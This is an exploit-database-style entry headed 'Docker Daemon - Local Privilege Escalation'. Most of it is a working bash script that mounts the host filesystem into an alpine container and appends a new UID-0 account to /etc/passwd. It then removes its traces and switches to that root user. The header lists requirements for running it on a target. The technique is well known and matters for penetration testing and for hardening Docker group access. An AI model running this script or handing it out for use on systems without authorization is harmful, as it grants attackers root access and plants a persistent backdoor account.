# Exploit Title: Docker Daemon - Local Privilege Escalation
# Date: 12 august 2020
# Exploit Author: flast101
# Vendor Homepage: https://www.docker.com/
# Software Link: https://www.docker.com/products/docker-desktop
# Version: all 
# Tested on: tested on version 19.03.7, build 7141c19, OS Kali 2020.2
# CVE : N/A

# This is a known trick abusing badly configured machines with Docker. This script 
# obtains root privileges from any host account with access to the Docker daemon, 
# and creates a new root user by entering it directly in the /etc/passwd file with the creds 
# you provide. Usually this includes (but not only) accounts in the "docker" group.
#  
# Requirements:
#    - Access to a shell on the target with a user which can run Docker.
#    - The target should have either an internet connection or an image installed in Docker. Use 
#      docker images to check and change the “alpine” image accordingly. If there is no image go 
#      to https://hub.docker.com to get one (tar.gz file with its Dockerfile) and upload it on the 
#      target in your working directory.
#
# Detailed article: https://flast101.github.io/docker-privesc
# Contact: flast101.sec@gmail.com


#!/bin/bash

docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 ) 

if [ "$docker_test" == "CONTAINER ID" ]; then
	echo 'Please write down your new root credentials.'
    read -p 'Choose a root user name: ' rootname
    read -s -p 'Choose a root password: ' passw
    echo ""
    read -p 'Choose the the salt to hash your password: ' salt
    hpass=$(openssl passwd -1 -salt $salt $passw)

    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
    mv new_account /tmp/new_account
    docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
    sleep 1; echo 'Please wait...'; sleep 1; echo 'Running container...'; sleep 1; echo 'Creating root user...';
    docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
    sleep 1; echo '...'
    
    echo 'Success! Root user ready. Enter your password to login as root:'
    docker rm -f flast101.github.io
    rm /tmp/new_account
    su $rootname

elif [ $(id -u) -eq 0 ]; then
    echo "The user islready root. Have fun ;-)"
    exit

else echo "Your account does not have permission to execute docker or docker is running, aborting..."
	exit

fi
